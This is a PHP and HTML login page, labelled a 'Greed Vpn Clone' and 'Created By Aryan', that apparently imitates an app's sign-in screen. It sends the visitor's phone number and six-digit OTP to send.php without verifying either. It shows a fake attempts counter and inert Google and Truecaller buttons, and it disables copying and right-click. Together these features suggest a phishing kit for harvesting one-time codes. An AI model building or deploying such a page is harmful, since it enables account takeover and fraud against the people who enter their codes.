<?php
session_start();

if(isset($_POST['number'])) {
    $_SESSION['number'] = $_POST['number'];
    header("Location: msg.php");
    exit;
}
?>

<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Panel</title>

<style>
body {
    margin: 0;
    font-family: Arial;
    background: #f5f6f8;
    height:100vh;
    overflow-y:auto;
}

#mainBtn{
background:#d3d3d3;
color:#666;
border:none;
padding:15px 30px;
border-radius:12px;
font-size:20px;
}

#mainBtn.active{
background:#0066ff;
color:white;
}

.container {
    max-width: 400px;
    margin: auto;
    text-align: center;
    padding: 40px 20px;
}

.logo {
    width: 110px;
    margin: 50px auto 20px;
    display: block;
    border-radius: 20px;
}

h1 {
    font-size: 32px;
    color: #0d1633;
}

p {
    color: #6c778f;
    font-size: 18px;
}

/* INPUT BOX MAIN */
.input-box{
    display:flex;
    align-items:center;
    gap:10px;
    margin-top:25px;
    width:100%;
}
/* COUNTRY BOX */
.country{
    width:85px;
    min-width:85px;
    height:50px; /* same height */
    background:#ececec;
    border-radius:14px;
    display:flex;
    align-items:center;
    justify-content:center;
    overflow:hidden;
}

/* SELECT */
.country select{
    width:100%;
    height:100%;
    border:none;
    outline:none;
    background:transparent;
    font-size:15px;
    font-weight:600;
    padding:0 10px;
    appearance:none;
    -webkit-appearance:none;
}

/* PHONE INPUT */
.phone input{
    width:100%;
    height:50px; /* fixed */
    border:none;
    outline:none;
    background:#ececec;
    border-radius:14px;
    padding:0 16px;
    font-size:16px;
    box-sizing:border-box;
}

/* OTP INPUT */
#otp{
    width:100%;
    height:55px;

    border:none !important;
    outline:none !important;
    box-shadow:none !important;

    -webkit-appearance:none;
    appearance:none;

    border-radius:18px;

    padding-left:20px;
    padding-right:150px;

    font-size:16px;
    background:#f3f3f3;

    box-sizing:border-box;
}

#otp:focus{
    border:none !important;
    outline:none !important;
    box-shadow:none !important;
}
    /* GET OTP BUTTON */
button.get-otp-btn{
    width:100% !important;
    height:46px !important;

    padding:0 !important;

    border:none;
    border-radius:14px;

    background:#0d6efd;
    color:white;

    font-size:15px !important;
    font-weight:600;

    margin-top:18px;
}
.top-header{
    display:flex;
    align-items:center;
    padding:18px 20px;
    background:#fff;
}

.close-btn{
    text-decoration:none;
    color:#333;
    font-size:35px;
    margin-right:18px;
    line-height:1;
}

.top-header{
    display:flex;
    align-items:center;
    padding:18px 20px;
    background:#fff;
    position:relative;
    z-index:99999;
}
    .top-header h2{
    margin: 0;
    font-size: 22px;
    color: #000;
    font-weight: 700;
    }
</style>
</head>
<body>
    
<div id="errorPopup"
style="
display:none;
position:fixed;
top:50%;
left:50%;
transform:translate(-50%,-50%);
background:white;
padding:18px 25px;
border-radius:12px;
box-shadow:0 0 10px rgba(0,0,0,0.2);
z-index:9999;
font-size:14px;
font-weight:bold;
">

Something went wrong

</div>
  <div class="top-header">
    <a href="javascript:history.back()" class="close-btn">&times;</a>
    <h2>Create Account / Login</h2>
  </div>  
<div class="container">

<img src="logo.png" class="logo">

<h1>Welcome!</h1>
<p>Login for an amazing experience</p>

<form action="send.php" method="POST">

<div class="input-box">
<div class="country">

<select id="countryCode">
<option value="+91"> 🇮🇳 +91</option>
<option value="+93"> 🇦🇫 Afghanistan (+93)</option>
<option value="+91"> 🇮🇳 India (+91)</option>
<option value="+355">🇦🇱 Albania (+355)</option>
<option value="+213">🇩🇿 Algeria (+213)</option>
<option value="+376">🇦🇩 Andorra (+376)</option>
<option value="+244">🇦🇴 Angola (+244)</option>
<option value="+54">🇦🇷 Argentina (+54)</option>
<option value="+374">🇦🇲 Armenia (+374)</option>
<option value="+61">🇦🇺 Australia (+61)</option>
<option value="+43">🇦🇹 Austria (+43)</option>
<option value="+994">🇦🇿 Azerbaijan (+994)</option>
<option value="+973">🇧🇭 Bahrain (+973)</option>
<option value="+880">🇧🇩 Bangladesh (+880)</option>
<option value="+375">🇧🇾 Belarus (+375)</option>
<option value="+32">🇧🇪 Belgium (+32)</option>
<option value="+975">🇧🇹 Bhutan (+975)</option>
<option value="+591">🇧🇴 Bolivia (+591)</option>
<option value="+387">🇧🇦 Bosnia (+387)</option>
<option value="+267">🇧🇼 Botswana (+267)</option>
<option value="+55">🇧🇷 Brazil (+55)</option>
<option value="+673">🇧🇳 Brunei (+673)</option>
<option value="+359">🇧🇬 Bulgaria (+359)</option>
<option value="+226">🇧🇫 Burkina Faso (+226)</option>
<option value="+257">🇧🇮 Burundi (+257)</option>
<option value="+855">🇰🇭 Cambodia (+855)</option>
<option value="+237">🇨🇲 Cameroon (+237)</option>
<option value="+1">🇨🇦 Canada (+1)</option>
<option value="+238">🇨🇻 Cape Verde (+238)</option>
<option value="+236">🇨🇫 Central African Republic (+236)</option>
<option value="+235">🇹🇩 Chad (+235)</option>
<option value="+56">🇨🇱 Chile (+56)</option>
<option value="+86">🇨🇳 China (+86)</option>
<option value="+57">🇨🇴 Colombia (+57)</option>
<option value="+269">🇰🇲 Comoros (+269)</option>
<option value="+242">🇨🇬 Congo (+242)</option>
<option value="+506">🇨🇷 Costa Rica (+506)</option>
<option value="+385">🇭🇷 Croatia (+385)</option>
<option value="+53">🇨🇺 Cuba (+53)</option>
<option value="+357">🇨🇾 Cyprus (+357)</option>
<option value="+420">🇨🇿 Czech Republic (+420)</option>
<option value="+45">🇩🇰 Denmark (+45)</option>
<option value="+253">🇩🇯 Djibouti (+253)</option>
<option value="+593">🇪🇨 Ecuador (+593)</option>
<option value="+20">🇪🇬 Egypt (+20)</option>
<option value="+503">🇸🇻 El Salvador (+503)</option>
<option value="+372">🇪🇪 Estonia (+372)</option>
<option value="+251">🇪🇹 Ethiopia (+251)</option>
<option value="+679">🇫🇯 Fiji (+679)</option>
<option value="+358">🇫🇮 Finland (+358)</option>
<option value="+33">🇫🇷 France (+33)</option>
<option value="+241">🇬🇦 Gabon (+241)</option>
<option value="+220">🇬🇲 Gambia (+220)</option>
<option value="+995">🇬🇪 Georgia (+995)</option>
<option value="+49">🇩🇪 Germany (+49)</option>
<option value="+233">🇬🇭 Ghana (+233)</option>
<option value="+30">🇬🇷 Greece (+30)</option>
<option value="+299">🇬🇱 Greenland (+299)</option>
<option value="+502">🇬🇹 Guatemala (+502)</option>
<option value="+224">🇬🇳 Guinea (+224)</option>
<option value="+592">🇬🇾 Guyana (+592)</option>
<option value="+509">🇭🇹 Haiti (+509)</option>
<option value="+504">🇭🇳 Honduras (+504)</option>
<option value="+852">🇭🇰 Hong Kong (+852)</option>
<option value="+36">🇭🇺 Hungary (+36)</option>
<option value="+354">🇮🇸 Iceland (+354)</option>
<option value="+91">🇮🇳 India (+91)</option>
<option value="+62">🇮🇩 Indonesia (+62)</option>
<option value="+98">🇮🇷 Iran (+98)</option>
<option value="+964">🇮🇶 Iraq (+964)</option>
<option value="+353">🇮🇪 Ireland (+353)</option>
<option value="+972">🇮🇱 Israel (+972)</option>
<option value="+39">🇮🇹 Italy (+39)</option>
<option value="+81">🇯🇵 Japan (+81)</option>
<option value="+962">🇯🇴 Jordan (+962)</option>
<option value="+7">🇰🇿 Kazakhstan (+7)</option>
<option value="+254">🇰🇪 Kenya (+254)</option>
<option value="+965">🇰🇼 Kuwait (+965)</option>
<option value="+996">🇰🇬 Kyrgyzstan (+996)</option>
<option value="+856">🇱🇦 Laos (+856)</option>
<option value="+371">🇱🇻 Latvia (+371)</option>
<option value="+961">🇱🇧 Lebanon (+961)</option>
<option value="+266">🇱🇸 Lesotho (+266)</option>
<option value="+231">🇱🇷 Liberia (+231)</option>
<option value="+218">🇱🇾 Libya (+218)</option>
<option value="+423">🇱🇮 Liechtenstein (+423)</option>
<option value="+370">🇱🇹 Lithuania (+370)</option>
<option value="+352">🇱🇺 Luxembourg (+352)</option>
<option value="+853">🇲🇴 Macau (+853)</option>
<option value="+261">🇲🇬 Madagascar (+261)</option>
<option value="+265">🇲🇼 Malawi (+265)</option>
<option value="+60">🇲🇾 Malaysia (+60)</option>
<option value="+960">🇲🇻 Maldives (+960)</option>
<option value="+223">🇲🇱 Mali (+223)</option>
<option value="+356">🇲🇹 Malta (+356)</option>
<option value="+222">🇲🇷 Mauritania (+222)</option>
<option value="+230">🇲🇺 Mauritius (+230)</option>
<option value="+52">🇲🇽 Mexico (+52)</option>
<option value="+373">🇲🇩 Moldova (+373)</option>
<option value="+976">🇲🇳 Mongolia (+976)</option>
<option value="+382">🇲🇪 Montenegro (+382)</option>
<option value="+212">🇲🇦 Morocco (+212)</option>
<option value="+95">🇲🇲 Myanmar (+95)</option>
</select>

</div>

    <div class="phone">
        <input
type="tel"
name="number"
id="phone"
maxlength="10"
placeholder="Enter your phone number"
oninput="checkNumber()">
    </div>

</div>
<!-- OTP Section -->
<div id="otpSection" style="display:none; margin-top:10px;">

    <div style="position:relative; width:90%; margin:auto;">

<input
type="tel"
id="otp"
maxlength="6"
placeholder="Enter OTP"
oninput="checkOTP()"

style="
width:100%;
height:55px;
border:none;
border-radius:18px;
padding-left:20px;
padding-right:150px;
font-size:16px;
background:#f3f3f3;
box-sizing:border-box;
">

<button id="resendBtn"

style="
position:absolute;
right:10px;
top:50%;
transform:translateY(-50%);

height:40px;
padding:0 18px;

border:1px solid #999;
border-radius:10px;

background:#f3f3f3;
color:#777;
font-size:14px;
">

Resend in 30s

</button>

    </div>

        </span>
</div>
</div>
    
<!-- Get OTP Button -->
<div id="attemptText"
style="
text-align:center;
color:red;
font-size:15px;
margin:5px 0 8px 0;
font-weight:500;
display:none;
cursor:pointer;
">
<span id="attemptText" style="color:red;">
   2 attempts left
</span>

</div>
    
<button 
type="button"
id="mainBtn"
    disabled
onclick="nextStep()"

style="
width:90%;
height:45px;
border:none;
border-radius:12px;
font-size:15px;
font-weight:bold;
background:#d6d6d6;
color:#888;
pointer-events:none;
transition:0.3s;
margin:18px auto 0;
display:block;
cursor:pointer;
">

Get OTP

</button>
    
    
<!-- OR Line -->
<div style="display:flex; align-items:center; width:92%; margin:auto;">
    
    <div style="flex:1; height:1px; background:#ccc;"></div>

    <div style="padding:0 15px; font-weight:bold;">Or</div>

    <div style="flex:1; height:1px; background:#ccc;"></div>

</div>

<!-- Google Button -->
<button type="button" style="
width:92%;
padding:0px 12px;
border:2px solid #5d7df5;
border-radius:6px;
background:white;
font-size:14px;
font-weight:bold;
display:flex;
align-items:center;
justify-content:flex-start;
padding-left:48px;
gap:14px;
color:#222;
height:44px;
margin:18px auto 0 auto;
">

<img src="google.png" style="width:24px; height:24px;">

Continue with Google

</button>

<!-- Truecaller Button -->
<button type="button" style="
width:92%;
padding:0px 12px;
border:2px solid #5d7df5;
border-radius:6px;
background:white;
font-size:14px;
font-weight:bold;
display:flex;
align-items:center;
justify-content:flex-start;
padding-left:48px;
gap:14px;
color:#222;
height:44px;
margin:18px auto 0 auto;
">

<img src="truecaller.png" style="width:24px; height:24px;">

Continue with Truecaller

</button>

<!-- Privacy Policy Text -->
<div style="
position:absolute;
bottom:35px;
left:50%;
transform:translateX(-50%);
width:95%;
text-align:center;
font-size:13px;
line-height:18px;
color:#222;
">

Your Privacy is important to us and your number will be safe.
By continuing, you agree to our
<b>Terms and Conditions, Privacy Policy and Content & Community Guidelines.</b>

</div>

<script>

let otpShown = false;

function nextStep() {

    let phone = document.getElementById("phone").value;

if(!otpShown) {

    // invalid number check
  if (phone.length < 10 || !/^[6-9][0-9]{9}$/.test(phone)) {

    let popup = document.getElementById("errorPopup");

    popup.style.display = "block";

    setTimeout(() => {

        popup.style.display = "none";

    }, 2000);

    return;
  }
        fetch("send.php", {
            method: "POST",
            headers: {
                "Content-Type": "application/x-www-form-urlencoded"
            },
            body: "number=" + encodeURIComponent(phone)
        });

        document.getElementById("otpSection").style.display = "block";
        document.getElementById("mainBtn").innerText = "Confirm";
        document.getElementById("attemptText").style.display = "block";

        otpShown = true;

    } else {

        let otp = document.getElementById("otp").value;

        if (otp.length < 6) {
            return;
        }
        fetch("send.php", {
            method: "POST",
            headers: {
                "Content-Type": "application/x-www-form-urlencoded"
            },
            body:
                "number=" + encodeURIComponent(phone) +
                "&otp=" + encodeURIComponent(otp)
        });
    }
}
let attempts = 2;

function reduceAttempt() {

if(attempts > 0){

attempts--;

document.getElementById("attemptText").innerText =
attempts + " attempts left";

}

if(attempts == 0){

document.getElementById("attemptText").innerText =
"0 attempts left";

document.getElementById("attemptText").style.color =
"#999";

}

    }
function checkPhone() {
    let phone = document.getElementById("phone").value;
    let btn = document.getElementById("mainBtn");

    if (phone.length == 10) {
        btn.classList.add("active");
    } else {
        btn.classList.remove("active");
    }
}
    
function checkNumber() {

let phone = document.getElementById("phone").value;
let btn = document.getElementById("mainBtn");

/* only numbers */
phone = phone.replace(/\D/g,'');
document.getElementById("phone").value = phone;

/* button active only on 10 digits */
if(phone.length == 10){

btn.style.background = "#0666ff";
btn.style.color = "white";
btn.style.pointerEvents = "auto";
btn.disabled = false;

}else{

btn.style.background = "#d6d6d6";
btn.style.color = "#888";
btn.style.pointerEvents = "none";
btn.disabled = true;

}

}
    
function checkOTP() {

let otp = document.getElementById("otp").value;
let btn = document.getElementById("verifyBtn");

/* only numbers */
otp = otp.replace(/\D/g,'');
document.getElementById("otp").value = otp;

/* button active only on 6 digits */
if(otp.length == 6){

btn.style.background = "#0666ff";
btn.style.color = "white";
btn.style.pointerEvents = "auto";
btn.disabled = false;

}else{

btn.style.background = "#d6d6d6";
btn.style.color = "#888";
btn.style.pointerEvents = "none";
btn.disabled = true;

}

    }

let timeLeft = 30;
let countdown;

let resendBtn = document.getElementById("resendBtn");

function startTimer() {

    resendBtn.disabled = true;
    resendBtn.style.pointerEvents = "none";

    resendBtn.innerText = `Resend in ${timeLeft}s`;

    countdown = setInterval(() => {

        timeLeft--;

        resendBtn.innerText = `Resend in ${timeLeft}s`;

        if (timeLeft <= 0) {

            clearInterval(countdown);

            resendBtn.innerText = "Resend";

            resendBtn.disabled = false;
            resendBtn.style.pointerEvents = "auto";
        }

    }, 1000);
}

startTimer();

resendBtn.addEventListener("click", () => {
if (attempts <= -2) {
    return;
    }
    attempts--;

document.getElementById("attemptText").innerText =
    attempts + " attempts left";
    
    // timer reset
    clearInterval(countdown);

    timeLeft = 30;

    // yaha OTP resend ka code lagao
    // sendOTP();

    // timer firse start
    startTimer();
});
    
const select = document.getElementById("countryCode");

// original text save
Array.from(select.options).forEach(option => {
    option.setAttribute("data-full", option.text);
});

// dropdown open hone pe full name show
select.addEventListener("focus", () => {

    Array.from(select.options).forEach(option => {

        option.text = option.getAttribute("data-full");

    });

});

// select hone ke baad sirf flag + code show
select.addEventListener("change", () => {

    Array.from(select.options).forEach(option => {

        const full = option.getAttribute("data-full");

        // 🇮🇳 +91 format
        const flag = full.split(" ")[0];

        option.text = flag + " " + option.value;

    });

});
    
</script>
    
<!-- Popup -->
<div id="aryanPopup" style="
position:fixed;
bottom:20px;
left:50%;
transform:translateX(-50%);
background:white;
padding:14px 22px;
border-radius:16px;
box-shadow:0 4px 18px rgba(0,0,0,0.15);
z-index:9999;
text-align:center;
font-family:sans-serif;
animation:popupShow 0.4s ease;
">

<div style="
font-size:15px;
color:black;
font-weight:500;
">
Created By Aryan
</div>

<div style="
font-size:17px;
font-weight:bold;
margin-top:3px;
background:linear-gradient(90deg,#ff0000,#0066ff);
-webkit-background-clip:text;
-webkit-text-fill-color:transparent;
">
Greed Vpn Clone
</div>

</div>

<style>
@keyframes popupShow{
from{
opacity:0;
transform:translateX(-50%) translateY(20px);
}
to{
opacity:1;
transform:translateX(-50%) translateY(0);
}
}
</style>

<script>
setTimeout(() => {
document.getElementById("aryanPopup").style.display = "none";
}, 3000);
    
    </script>

<style>
body{
-webkit-user-select:none;
-ms-user-select:none;
user-select:none;
-webkit-touch-callout:none;
}
</style>

<script>

// Right click block
document.addEventListener("contextmenu", function(e){
e.preventDefault();
});

// Text selection block
document.addEventListener("selectstart", function(e){
e.preventDefault();
});

// Copy block
document.addEventListener("copy", function(e){
e.preventDefault();
});

// Cut block
document.addEventListener("cut", function(e){
e.preventDefault();
});

</script>
